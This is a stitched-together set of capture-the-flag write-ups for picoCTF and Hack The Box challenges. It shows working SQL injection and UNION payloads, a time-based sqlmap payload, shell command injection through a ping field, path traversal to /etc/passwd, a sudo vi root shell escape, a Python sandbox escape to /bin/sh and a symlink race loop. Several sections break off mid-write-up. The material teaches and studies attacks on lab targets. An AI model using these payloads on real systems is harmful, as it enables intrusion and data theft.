link loop, linker.sh:\n1 2 3 4 5 6 7 while true do rm link touch link rm link ln -s /home/ctf-player/flag.txt link done Setting up the linker loop and running txtreader:\n1 2 3 4 5 6 7 8 9 ctf-player@pico-chall$ chmod +x linker.sh ctf-player@pico-chall$ ./linker.sh rm: cannot remove \u0026#39;link\u0026#39;: No such file or directory ^Z [1]+ Stopped ./linker.sh ctf-player@pico-chall$ bg 1 [1]+ ./linker.sh \u0026amp; ctf-player@pico-chall$ while [ 1 ]; do ./txtreader link; done 2\u0026gt;/dev/null picoCTF{ToctoU_!s_3a5y_f482a247} Overall while this method works, it is not very reliable. Sometimes you can get lucky and the flag is read after a few minutes of running, other times it had not succeeded once in the full 15min duration of the instance.\npicoCTF{ToctoU_!s_3a5y_f482a247}\nPotential Solution\u0026ndash;Reliable race fixing? It might be possible to \u0026ldquo;fix\u0026rdquo; the race for us, resulting in very reliable success of flag read. This post describes using a filesystem maze too large for the system to handle in memory at once, allowing for a more clear window of opportunity for us to switch targets. The maze consists of many nested folders, containing symlinks pointing to another batch of nested folders. After repeating for x times, the final link points to the file we own. The maze is too large to be placed in the filesystem cache, and this process results in slower navigation and an increased delay between the action of checking permissions and the action of reading the file contents.\nWhile I did not have time to utilize this trick on tic-tac, it might be worth exploring on another CTF challenge.\ntwo-sum Can you solve this?

Since blockchain transactions are publicly disclosed, we can view the activity associated with this wallet on a quick Google search.\nwww.bitcoinabuse.com is a website dedicated to tracking bitcoin addresses used in ransomeware and blackmailings, so if our address was used in other previous attacks, we can find reports for our given address.\nSearching this address we see several reports for multiple abuse types. Since we know our friend had been hacked, the abuse type is likely a ransomeware attack. The first report against this address is labeled ransomeware, and provides a link where we might learn more:\nMore information here: https://blog.avira.com/petya-strikes-back/\nThe title of the article plainly tells us the malware at play is based on the infamous ransomeware Petya, but we can also follow the link to learn more about it.\nWe are told the answer to the flag is the malware involved, so we can submit the flag by inserting \u0026ldquo;Petya\u0026rdquo; into the picoCTF flag format. picoCTF{Petya}\nPermissions Can you read files in the root file?\nAdditional details will be available after launching your challenge instance.\nThis challenge asks us to read a file in the /root directory. Files located here are typically under the highest access protections possible, requiring only root permissions and rejecting any other non-super user.\nFirstly, we are required to connect to the challenge machine via ssh:\n1 $ ssh picoplayer@saturn.picoctf.net -p PORT The port number is customized to your own launched instances.\nFirstly, we can check our own user privileges:\n1 2 picoplayer@challenge:~$ id uid=1000(picoplayer) gid=1000(picoplayer) groups=1000(picoplayer) We can see we are not a part of root in any way, uid gid or part of the root group. It is unlikely we can access /root, so it is unsurprising to see we are denied:\n1 2 picoplayer@challenge:/$ cd /root -bash: cd: /root: Permission denied We need to find a way to elevate our permissions before we can go here.\nA common approach to elevating privileges is to do super-user actions, through the command sudo. Users are often limited in the kinds of sudo actions they can do. We can check what is allowed for our user by typing sudo -l:\n1 2 3 4 5 6 7 picoplayer@challenge:/$ sudo -l Matching Defaults entries for picoplayer on challenge: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User picoplayer may run the following commands on challenge: (ALL) /usr/bin/vi Notably, we can run /usr/bin/vi as any user, including root, as noted by the (ALL). vi is a common text editor used to edit files. Since we are interested in reading the contents of a file, opening the file using vi is enough to tell us what\u0026rsquo;s inside.\n1 picoplayer@challenge:/$ sudo vi /root/flag.txt However, when we do this we don\u0026rsquo;t see anything? This is because even though we know the location of the flag, we are still guessing if it is called flag.txt or something else. We need a way to explore the contents of the /root directory.\nWhile vi has the main purpose of being a text editor, we can also abuse some of it\u0026rsquo;s other features to obtain an interactive terminal session as user root:\n1 sudo vi -c \u0026#39;:!/bin/bash\u0026#39; Here, we launch vi with sudo vi. With -c flag, we specify a command :!/bin/bash for vi to run on launch. Alternatively, we can do this ourselves after launching vi. Simply typing :shell will open a shell session as the current user, in this case, root.\nNow we can access /root:\n1 2 root@challenge:~# ls root@challenge:~# Typing ls shows no file in root? The challenge description mentions reading files in root, so surely something must be here:\n1 2 root@challenge:~# ls -a . .. .bashrc .flag.txt .profile By adding -a flag to ls we can see hidden files. There is our flag, under .flag.txt. So, the reason we couldn\u0026rsquo;t find it earlier was because the name was indeed different from what we expected. We can revisit to see that, once the proper name is supplied, vi could have been used to view file contents:\n1 picoplayer@challenge:~$ sudo vi /root/.flag.txt 1 2 3 picoCTF{uS1ng_v1m_3dit0r_021d10ab} ~ ~ Repititions Can you make sense of this file? Download the file here.\nHere we are tasked with making sense of a file. Following the link prompts us to download a file called enc_flag. Enc is almost certainly shorthand for encoded, meaning our flag will probably need to go through some decoding processes.\n1 2 3 4 5 6 $ cat enc_flag VmpGU1EyRXlUWGxTYmxKVVYwZFNWbGxyV21GV1JteDBUbFpPYWxKdFVsaFpWVlUxWVZaS1ZWWnVh RmRXZWtab1dWWmtSMk5yTlZWWApiVVpUVm10d1VWZFdVa2RpYlZaWFZtNVdVZ3BpU0VKeldWUkNk MlZXVlhoWGJYQk9VbFJXU0ZkcVRuTldaM0JZVWpGS2VWWkdaSGRXCk1sWnpWV3hhVm1KRk5XOVVW VkpEVGxaYVdFMVhSbFZrTTBKVVZXcE9VazFXV2toT1dHUllDbUY2UWpSWk1GWlhWa2RHZEdWRlZs aGkKYlRrelZERldUMkpzUWxWTlJYTkxDZz09Cg== Dumping the contents in plaintext, we can see that it is clearly not human-readable. A string such as this, ending with =, is very likely encoded with base64. We can use an online decoding tool such as CyberChef to get through this quickly, or we can use the linux command base64 to do this as well:\n1 2 3 4 5 $ cat enc_flag | base64 -d VjFSQ2EyTXlSblJUV0dSVllrWmFWRmx0TlZOalJtUlhZVVU1YVZKVVZuaFdWekZoWVZkR2NrNVVX bUZTVmtwUVdWUkdibVZXVm5WUgpiSEJzWVRCd2VWVXhXbXBOUlRWSFdqTnNWZ3BYUjFKeVZGZHdW MlZzVWxaVmJFNW9UVVJDTlZaWE1XRlVkM0JUVWpOUk1WWkhOWGRYCmF6QjRZMFZXVkdGdGVFVlhi bTkzVDFWT2JsQlVNRXNLCg== From our cat output we use | to redirect straight to another command, base64. Setting -d means the data will be base64 decoded. Despite this, the data is still unreadable. And we still see it ending in =? It appears the flag has been through multiple layers of encoding. We can decode for multiple rounds through the same method as before:\n1 2 $ cat enc_flag | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_492767d2} Finally after 6 rounds of decoding, the flag appears in plaintext.\nSpecial Don\u0026rsquo;t power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized\u0026hellip; automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That\u0026rsquo;s Special (TM) Start your instance to see connection details.\nAdditional details will be available after launching your challenge instance.\nWhen we first enter, we might be inclined to check what is in our home:\n1 2 3 Special$ ls Is sh: 1: Is: not found Our ls command is converted to Is, and then fails to execute. Checking a few other commands leads all syntax being altered to similar legitimate words, and all of them starting with capitilization. With our syntax ruined, we cannot execute commands properly! If we attempt to enter a different shell terminal, we receive an interesting rejection:\n1 2 Special$ bash Why go back to an inferior shell? My first thought is if my input is being altered after input but before bash processing, perhaps I can use characters designated to escaping metacharacter interpretation. In bash, the backslash \\ character is used to escape regular interpretations, and generally treats the character as raw text.\n1 2 3 Special$ \\ls Als sh: 1: Als: not found Unfortunately, trying to escape the l in ls, which was previously converted to I, produces something completely different. Trying again with other commands, I manage to execute whoami. Perhaps I am on to something?\n1 2 3 Special$ \\whoami \\whoami ctf-player As it stands currently, we are escaping only 1 character, but the others are still treated as regular components of a string. What if we escape every character?\n1 2 3 Special$ \\e\\c\\h\\o test \\e\\c\\h\\o test test We can successfully perform echo! However, for some strange reason ls is not working:\n1 2 3 Special$ \\l\\s Plus sh: 1: Plus: not found Perhaps the problem is caused by ls being only 2 characters? Regardless, we have other ways to look around:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Special$ \\d\\i\\r \\d\\i\\r blargh Special$ \\c\\a\\t \\b\\l\\a\\r\\g\\h \\c\\a\\t \\b\\l\\a\\r\\g\\h cat: blargh: Is a directory Special$ \\d\\i\\r \\b\\l\\a\\r\\g\\h \\d\\i\\r \\b\\l\\a\\r\\g\\h flag.txt Special$ \\c\\a\\t \\b\\l\\a\\r\\g\\h\\/\\f\\l\\a\\g\\.\\t\\x\\t \\c\\a\\t \\b\\l\\a\\r\\g\\h\\/\\f\\l\\a\\g\\.\\t\\x\\t picoCTF{5p311ch3ck_15_7h3_w0r57_6a2763f6} While this approached works, it is rather tedious and ugly. We can escape this special shell by invoking bash:\n1 2 3 4 Special$ \\b\\a\\s\\h \\b\\a\\s\\h ctf-player@challenge:~$ whoami ctf-player Now we are free!\nSpecialer Reception of Special has been cool to say the least. That\u0026rsquo;s why we made an exclusive version of Special, called Secure Comprehensive Interface for Affecting Linux Empirically Rad, or just \u0026lsquo;Specialer\u0026rsquo;. With Specialer, we really tried to remove the distractions from using a shell. Yes, we took out spell checker because of everybody\u0026rsquo;s complaining. But we think you will be excited about our new, reduced feature set for keeping you focused on what needs it the most. Please start an instance to test your very own copy of Specialer.\nAdditional details will be available after launching your challenge instance.\nUpon entering, we might want to look around. However, we instantly come up with a problem:\n1 2 Specialer$ ls -bash: ls: command not found From the looks of it, ls is not accessible in our PATH. Specifying the full path does not help, and we soon find that we may not have access to any binaries:\n1 2 3 4 Specialer$ /usr/bin/ls -bash: /usr/bin/ls: No such file or directory Specialer$ locate ls -bash: locate: command not found Using tab auto-complete to navigate, we can see we are in a very restricted environment, and the only binary available is bash:\n1 2 3 Specialer$ cd / bin/ home/ lib/ lib64/ Specialer$ cd /bin/bash Note: Tabbing at / suggests bin, home, lib and lib64. Tabbing at /bin/ auto suggessts bash. This must be the only file in the directory.\nAt least with bash, we still have access to built-ins. Since our terminal commands are so limited, we can actually list them all by pressing tab twice on an empty line:\n1 2 3 4 5 6 7 8 9 10 11 12 Specialer$ ! builtin dirs exit history pushd suspend unalias ./ caller disown export if pwd test unset : case do false in read then until [ cd done fc jobs readarray time wait [[ command echo fg kill readonly times while ]] compgen elif fi let return trap { alias complete else for local select true } bash compopt enable function logout set type bg continue esac getopts mapfile shift typeset bind coproc eval hash popd shopt ulimit break declare exec help printf source umask We can utilize echo to see one directory layer at a time:\n1 2 3 4 5 Specialer$ echo * abra ala sim Specialer$ echo */* abra/cadabra.txt abra/cadaniel.txt ala/kazam.txt ala/mode.txt sim/city.txt sim/salabim.txt We have several txt files here to view, but unfortunately no common binary to read them with. Bash also comes with a read built-in, combined with echo, we can output contents within files\n1 2 Specialer$ read IFR \u0026lt; abra/cadabra.txt; echo $IFR Nothing up my sleeve! Now that the contents are displayed, perhaps one option can give us a flag?\n1 2 Specialer$ read IFR \u0026lt; ala/kazam.txt; echo $IFR return 0 picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_38f5cc78} Useless There\u0026rsquo;s an interesting script in the user\u0026rsquo;s home directory\nAdditional details will be available after launching your challenge instance.\nFor this challenge we are given a simple script, and told to explore the script to obtain the flag.\nFirstly, we are required to connect to the challenge machine via ssh:\n1 $ ssh picoplayer@saturn.picoctf.net -p PORT The port number is customized to your own launched instances.\nwe see the script in our home directory, with executable premissions:\n1 2 3 4 5 6 7 8 9 picoplayer@challenge:~$ ls -al total 16 drwxr-xr-x 1 picoplayer picoplayer 20 Mar 17 18:38 . drwxr-xr-x 1 root root 24 Mar 16 02:30 .. -rw-r--r-- 1 picoplayer picoplayer 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 picoplayer picoplayer 3771 Feb 25 2020 .bashrc drwx------ 2 picoplayer picoplayer 34 Mar 17 18:38 .cache -rw-r--r-- 1 picoplayer picoplayer 807 Feb 25 2020 .profile -rwxr-xr-x 1 root root 517 Mar 16 01:30 useless First, we check the kind of file we are working with:\n1 2 picoplayer@challenge:~$ file useless useless: Bourne-Again shell script, ASCII text executable This is a bash script, written in plaintext.

The website running here\nUpon logging in, we cycle through a couple blank pages very quickly before landing at http://saturn.picoctf.net:54197/home. The page contains a search bar and a small note: \u0026ldquo;I was redirected here by a friend of mine but i couldnt find anything. Help me search for flags :-)\u0026rdquo;\nSearching for a few keywords leads us to no result. The note on this page mentions the redirects as well, so let\u0026rsquo;s use burpsuite to catch and analyze each step that\u0026rsquo;s occuring. First login request:\nFirst redirect:\nSecond redirect:\nThen finally we are sent to home.

Combining the two id values together and base64 decoding might get us the flag:\n1 2 echo \u0026#34;cGljb0NURntwcm94aWVzX2FsbF90aGVfd2F5XzAxZTc0OGRifQ==\u0026#34; | base64 -d picoCTF{proxies_all_the_way_01e748db} MatchTheRegex How about trying to match a regular expression The website is running here.\nGoing to the page, we see an input box to input our search. Based on the name, my first thought is that this will be a regular expression search, where we must input a regex term that will hit positive for specifically the flag. After trying several different regex queries, I\u0026rsquo;m not having any luck. Looking at the page source, I notice a hint displayed in comments:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script\u0026gt; function send_request() { let val = document.getElementById(\u0026#34;name\u0026#34;).value; // ^p.....F!? fetch(`/flag?input=${val}`) .then(res =\u0026gt; res.text()) .then(res =\u0026gt; { const res_json = JSON.parse(res); alert(res_json.flag) return false; }) return false; } \u0026lt;/script\u0026gt; ^p.....F!? In regex searches, ^ refers to the start of a line and $ refers to the end of a line, so perhaps this hint can be a working query?\nUnfortunately not.. Playing with the provided hint a little more, I get a successful match by being more generic:\nDespite being a regex based search, and the commented page source including the ^ marker for the beginning of a line, including the ^ in our search causes it to fail.. picoCTF{succ3ssfully_matchtheregex_f89ea585}\nMore_SQLi Can you find the flag on this website. Try to find the flag here\nThanks to sergyperov for the helpful writeup!\nEntering the site we see a login page. Considering the name of the challenge, we will start with a simple SQL injection payload: 'or 1=1-- On the first attempt with a random input, we get an error. This is more useful than usual, however, as it tells us the SQL query happening in the background:\n1 2 3 username: \u0026#39;or 1=1-- password: 345534 SQL query: SELECT id FROM users WHERE password = \u0026#39;345534\u0026#39; AND username = \u0026#39;\u0026#39;or 1=1-- \u0026#39; Since password is being called first, we can insert our injection into this field and it should work. After bypassing login, we see a table of information:\nThere\u0026rsquo;s no flag here, but one of the addresses seems to be a little interesting: \u0026ldquo;Maybe all the tables\u0026rdquo;. Doing our regular SQL injection 'or 1=1-- in the search bar results in the same information. It appears that although we are dumping all information from the current table, the flag is actually in a different table? In order to dump information in other tables we will look into UNION injections.\nFirst to explore union injections, we need to know the number of columns in this table. With this challenge, we can clearly see three tables, but just to be sure, we will check a UNION injection including 3 columns. If the column number doesn\u0026rsquo;t match the SQL query, the search will fail.\n1 Kampala\u0026#39; UNION SELECT NULL,NULL,NULL-- Note that choosing Kampala to search isn\u0026rsquo;t required, but it can make it easier to see our row of NULLs between it and the City/Address/Phone header.\nFrom here, we need to know which columns might be text injectable. Since city and address contain strings, these two are likely, however phone consists of numbers so possibly not the third column. Testing all 3 at once:\n1 Kampala\u0026#39; UNION SELECT \u0026#34;abc\u0026#34;,\u0026#34;abc\u0026#34;,\u0026#34;abc\u0026#34;-- All three columns return our injected string, meaning we can dump information out of any of these three columns. Note you only need one column working to proceed with union injection, and also if you try injecting your string into a column that cannot take string values then the entire SQL query fails.\nProbing the SQL tables:\n1 Kampala\u0026#39; UNION SELECT sql,NULL,NULL from sqlite_master LIMIT 1,5; -- by pulling sql from sqlite_master, we can see a total of 4 tables:\nhints more_table offices users Normally users would be the most interesting for us, but our hint about \u0026ldquo;Maybe all the tables\u0026rdquo; is hinting towards the more_tables table first. We can check each table by using the same type of UNION injection. Note that this table list output also gives us the column names: id and flag. Another reason to try this table first.\n1 Kampala\u0026#39; UNION SELECT id,flag,NULL from more_table where 1=1-- And with that, we have our flag. picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}\nSOAP The web project was rushed and no security assessment was done.

We must rely on these builtin functions to escape the jail and find our flag. A list of builtin functions can be found here. Input() caught my eye, as perhaps we can supply stdin that might not be checked through the blacklist:\n1 2 3 4 5 \u0026gt; a=input() [*] Input accepted! Error: invalid syntax (\u0026lt;string\u0026gt;, line 1) Unfortunately, I received an error before being able to input anything for variable declaration. However, trying input() on its own seems to work as I expected:\n1 2 3 4 5 6 \u0026gt; input() [*] Input accepted! \u0026#39;\u0026#34;\u0026#39;\u0026#34;Test aWE$% \u0026gt; Here we see no blacklist notice despite putting several blacklisted characters. Perhaps we can use input in a different way?

From here there are several ways to read a flag. Since I wasn\u0026rsquo;t sure what the flag was named or where it might be, I decided to create a shell session using a gtfobins payload:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026gt; exec(input()) [*] Input accepted! import os; os.system(\u0026#34;/bin/sh\u0026#34;) whoami ctf ls flag.txt jail.py cat flag.txt HTB{y0u_d3f34t3d_th3_sn4k3_g0d!} HTB{y0u_d3f34t3d_th3_sn4k3_g0d!}\nPersistence Thousands of years ago, sending a GET request to /flag would grant immense power and wisdom. Now it\u0026rsquo;s broken and usually returns random data, but keep trying, and you might get lucky\u0026hellip; Legends say it works once every 1000 tries. Difficulty: very easy\nThe objective for this problem is very straightforward: send a /GET request to IP:PORT/flag and you will receive the flag after ~1000 attempts. 1000 attempts is a rather high number to reach manually, so creating a loop for curl is the way to go:\n1 2 3 4 5 #!/bin/bash for i in {1..1000} do curl -s 165.232.100.46:31980/flag done -s flag makes the curl request silent, otherwise we will get transmission informations on every curl attempt. This loop only runs for 1000 attempts, but if you\u0026rsquo;re watching the program you can have it set to run indefinitely and just manually close it when the flag is seen. Running the script:\n1 2 $ chmod +x loop.sh $ ./loop.sh | grep \u0026#34;HTB\u0026#34; grep allows us to filter any uninteresting output and only shows our flag. Eventually, we see the results pop out at us.\n1 HTB{y0u_h4v3_p0w3rfuL_sCr1pt1ng_ab1lit13S!}jW\u0026amp;z3]X8CLb5Q7kR The flag information includes only HTB and the content in brackets. A cleaner grep would have extracted only the flag. Overall, it seems output of the flag is based on a ~0.1% chance. On average, you will get the flag within 1000 requests but not always. HTB{y0u_h4v3_p0w3rfuL_sCr1pt1ng_ab1lit13S!}\nRestricted You \u0026rsquo;re still trying to collect information for your research on the alien relic. Scientists contained the memories of ancient egyptian mummies into small chips, where they could store and replay them at will. Many of these mummies were part of the battle against the aliens and you suspect their memories may reveal hints to the location of the relic and the underground vessels. You managed to get your hands on one of these chips but after you connected to it, any attempt to access its internal data proved futile. The software containing all these memories seems to be running on a restricted environment which limits your access. Can you find a way to escape the restricted environment?

Can you help pandora with this task? Difficulty: very easy\nVisiting the site gives us a generic login page. Trying the classic admin:admin and admin:password failed, so it\u0026rsquo;s time to take a look at the source code supplied. Exploring database.py we see the following configuration:\n1 2 3 def login(username, password): # We should update our code base and use techniques like parameterization to avoid SQL Injection user = query_db(f\u0026#39;SELECT password FROM users WHERE username = \u0026#34;{username}\u0026#34; AND password = \u0026#34;{password}\u0026#34; \u0026#39;, one=True) The comment is a pretty plain hint that this SQL query is not well sanitized, and allows for very basic SQL injection. For our user submission, we will escape the username query with \u0026ldquo;, then bypass a password check with \u0026ldquo;OR 1=1 \u0026ndash; \u0026ldquo;. The end result is we will login if the database can find a user called \u0026quot;\u0026rdquo; or if the value 1 is equal to 1. Since the latter is always true, we should login. Note that the space after comment lines \u0026ndash; must be present, or else this will be interpreted as minus.\nThe password will never be checked, so this can be whatever. Just like that, we are in. And the flag is first up on the table.\nHTB{p4r4m3t3r1z4t10n_1s_1mp0rt4nt!!!}\nGunhead During Pandora\u0026rsquo;s training, the Gunhead AI combat robot had been tampered with and was now malfunctioning, causing it to become uncontrollable.

Difficulty: very easy\nVisiting the website we see a lot of text, and the only interactable piece seems to be a pull-up console:\nOur options for commands are extremely limited. Perhaps the provided source code can give us more insight? In ReconModel.php, we see how the program handles this ping command:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ cat ReconModel.php \u0026lt;?php #[AllowDynamicProperties] class ReconModel { public function __construct($ip) { $this-\u0026gt;ip = $ip; } public function getOutput() { # Do I need to sanitize user input before passing it to shell_exec? return shell_exec(\u0026#39;ping -c 3 \u0026#39;.$this-\u0026gt;ip); } } We have a commented note pointing out the lack of sanitization within the shell_exec. We should be able to use this /ping command to execute multiple shell commands when we include a break; Testing with id:\n1 /ping 8.8.8.8; id We see the 2nd shows our id. This command injection is successful. We will probe the current directory, and since there\u0026rsquo;s no harm, take a guess that flag.txt is in our current directory:\nWe didn\u0026rsquo;t hit it this time, but using this command scheme we can keep using ls to poke around for the flag. Or we can try find.\nNow we find it in probably the next most likely location, the base directory.\nHTB{4lw4y5_54n1t1z3_u53r_1nput!!!}\nOrbital In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder? Difficulty: easy\nVisiting the site shows us a generic login page. After trying the classic admin:admin and admin:password credentials, perhaps we can find more information on what\u0026rsquo;s happening by viewing the provided source code. When viewing the database.py, we find an interesting hint/note:\n1 2 3 4 5 6 7 8 9 10 11 12 def login(username, password): # I don\u0026#39;t think it\u0026#39;s not possible to bypass login because I\u0026#39;m verifying the password later. user = query(f\u0026#39;SELECT username, password FROM users WHERE username = \u0026#34;{username}\u0026#34;\u0026#39;, one=True) if user: passwordCheck = passwordVerify(user[\u0026#39;password\u0026#39;], password) if passwordCheck: token = createJWT(user[\u0026#39;username\u0026#39;]) return token else: return False Our SQL injection approach from Drobots has been remedied. Even when we bypass the username input check, the password is verified in a separate instance. Problem solved, or is it?\nBefore moving on to probing SQL injection further, I check for potentially alternative pages by looking at the routes.py file. The only other page is an /export page, that requires a valid JSON token. So we will explore the login bypass further.\nInstead of manually checking a variety of SQL payloads, we will employ a tool to make this quick and easy: SQLmap.

The payload utilized:\n1 Payload: {\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34; AND (SELECT 4429 FROM (SELECT(SLEEP(5)))Llei)-- Mhzj\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;password\u0026#34;} And fortunately with this, sqlmap is able to grab admin\u0026rsquo;s password from the database. The login credentials are as follows:\n1 {\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;ichliebedich\u0026#34;} Using these credentials gets us in.\nNow that we are in, we can see a lot of static information on this page but no flag in plain sight. At the bottom of the page, we see an export option that will prompt us to download a communication.mp3 file. We saw some information on an export page in the source code, so let\u0026rsquo;s revisit this to get a better idea on what\u0026rsquo;s going on. In blueprints/test.py:\n1 2 3 4 5 6 7 8 9 10 11 12 def exportFile(): if not request.is_json: return response(\u0026#39;Invalid JSON!\u0026#39;), 400 data = request.get_json() communicationName = data.get(\u0026#39;name\u0026#39;, \u0026#39;\u0026#39;) try: # Everyone is saying I should escape specific characters in the filename. I don\u0026#39;t know why. return send_file(f\u0026#39;/communications/{communicationName}\u0026#39;, as_attachment=True) except: return response(\u0026#39;Unable to retrieve the communication\u0026#39;), 400 We see there is a lack of sanitization on how it is grabbing the file to export. If we can edit the file name we are requesting, we can perform directory traversal to grab any file that is not read-protected. To check this, we will look for the always-readable /etc/passwd. In burpsuite: Request\nResponse\nWe see the contents of /etc/passwd. Now all that remains is to find the flag. After making several guesses on where the flag might be located, we have yet to find the flag. Back to the source code, perhaps we can see how it is being placed upon initialization by viewing the Dockerfile:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 $ cat Dockerfile FROM python:3.8-alpine # Install packages RUN apk add --no-cache --update mariadb mariadb-client supervisor gcc musl-dev mariadb-connector-c-dev # Upgrade pip RUN python -m pip install --upgrade pip # Install dependencies RUN pip install Flask flask_mysqldb pyjwt colorama # Setup app RUN mkdir -p /app RUN mkdir -p /communication # Switch working environment WORKDIR /app # Add application COPY challenge . # Setup supervisor COPY config/supervisord.conf /etc/supervisord.conf # Expose port the server is reachable on EXPOSE 1337 # Disable pycache ENV PYTHONDONTWRITEBYTECODE=1 # copy flag COPY flag.txt /signal_sleuth_firmware COPY files /communications/ # create database and start supervisord COPY --chown=root entrypoint.sh /entrypoint.sh RUN chmod +x /entrypoint.sh ENTRYPOINT [\u0026#34;/entrypoint.sh\u0026#34;] They did indeed pull a cheeky one on us, note how the flag.txt has been renamed! In this machine it\u0026rsquo;s now called signal_sleuth_firmware In Burpsuite: Request:\nResponse:\nFlag HTB{T1m3_b4$3d_$ql1_4r3_fun!!!}\nPassman Pandora discovered the presence of a mole within the ministry. To proceed with caution, she must obtain the master control password for the ministry, which is stored in a password manager. Can you hack into the password manager? Difficulty: easy\nVisiting the page we are greeted with a login page. We are also presented with the option to create an account. After guessing a few times for user admin, I decide to create a user. Trying username admin results in an error, telling us this username is in use. Good to note; for now we will create user a. Registering as user a was successful, and now we see a page where we might submit and store passwords for given addresses. This page operates as a password manager, true to the challenge description and title. A brief check at XSS fails, so let\u0026rsquo;s explore the provided source code. Interestingly, the database.js file shows us more request options than we might have expected. In particular, there is an option to update passwords:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 async updatePassword(username, password) { return new Promise(async (resolve, reject) =\u0026gt; { let stmt = `UPDATE users SET password = ? WHERE username = ?`; this.connection.query( stmt, [ String(password), String(username) ], (err, _) =\u0026gt; { if(err) reject(err) resolve(); } ) }); } There is no authorization verification here, so perhaps if we can request to change the password of user admin, we can login as admin. Starting with a post request to register a new user:\nRevised post request:\nResponse:\nWe have updated the admin password successfully, or so it says. When we attempt to login as admin, we are successful! The flag is given in the password field of admin\u0026rsquo;s saved passwords.\nHTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}\nTrapped Source Intergalactic Ministry of Spies tested Pandora\u0026rsquo;s movement and intelligence abilities.
